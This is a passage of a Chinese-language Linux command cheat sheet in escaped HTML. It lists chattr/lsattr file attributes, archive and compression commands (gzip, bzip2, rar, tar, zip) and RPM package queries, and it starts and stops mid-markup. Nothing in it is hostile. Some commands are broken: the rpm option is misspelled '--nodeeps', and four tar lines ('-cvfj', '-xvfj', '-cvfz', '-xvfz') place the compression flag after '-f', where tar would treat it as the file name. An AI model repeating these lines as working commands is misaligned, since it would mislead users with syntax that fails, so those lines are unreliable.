STIKY 位</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>文件的特殊属性 - 使用 \"+\" 设置权限，使用 \"-\" 用于取消</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chattr +a file1 只允许以追加方式读写文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chattr +c file1 允许这个文件能被内核自动压缩/解压</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chattr +s file1 允许一个文件被安全地删除</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">lsattr 显示特殊的属性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>打包和压缩文件</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">bunzip2 file1.bz2 解压一个叫做 'file1.bz2'的文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">bzip2 file1 压缩一个叫做 'file1' 的文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">gunzip file1.gz 解压一个叫做 'file1.gz'的文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">gzip file1 压缩一个叫做 'file1'的文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">gzip -9 file1 最大程度压缩</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rar a file1.rar test_file 创建一个叫做 'file1.rar' 的包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rar a file1.rar file1 file2 dir1 同时压缩 'file1', 'file2' 以及目录 'dir1'</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rar x file1.rar 解压rar包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">unrar x file1.rar 解压rar包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tar -cvf archive.tar file1 创建一个非压缩的 tarball</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tar -cvf archive.tar file1 file2 dir1 创建一个包含了 'file1', 'file2' 以及 'dir1'的档案文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tar -tf archive.tar 显示一个包中的内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tar -xvf archive.tar 释放一个包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tar -xvf archive.tar -C /tmp 将压缩包释放到 /tmp目录下</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tar -cvfj archive.tar.bz2 dir1 创建一个bzip2格式的压缩包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tar -xvfj archive.tar.bz2 解压一个bzip2格式的压缩包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tar -cvfz archive.tar.gz dir1 创建一个gzip格式的压缩包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tar -xvfz archive.tar.gz 解压一个gzip格式的压缩包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">zip file1.zip file1 创建一个zip格式的压缩包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">zip -r file1.zip file1 file2 dir1 将几个文件和目录同时压缩成一个zip格式的压缩包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">unzip file1.zip 解压一个zip格式压缩包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>RPM 包 - （Fedora, Redhat及类似系统）</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -ivh package.rpm 安装一个rpm包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -ivh --nodeeps package.rpm 安装一个rpm包而忽略依赖关系警告</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -U package.rpm 更新一个rpm包但不改变其配置文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -F package.rpm 更新一个确定已经安装的rpm包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -e package_name.rpm 删除一个rpm包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -qa 显示系统中所有已经安装的rpm包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -qa | grep httpd 显示所有名称中包含 \"httpd\" 字样的rpm包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -qi package_name 获取一个已安装包的特殊信息</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -qg \"System Environment/Daemons\" 显示一个组件的rpm包</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -ql package_name 显示一个已经安装的rpm包提供的文件列表</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -qc package_name 显示一个已经安装的rpm包提供的配置文件列表</p><p 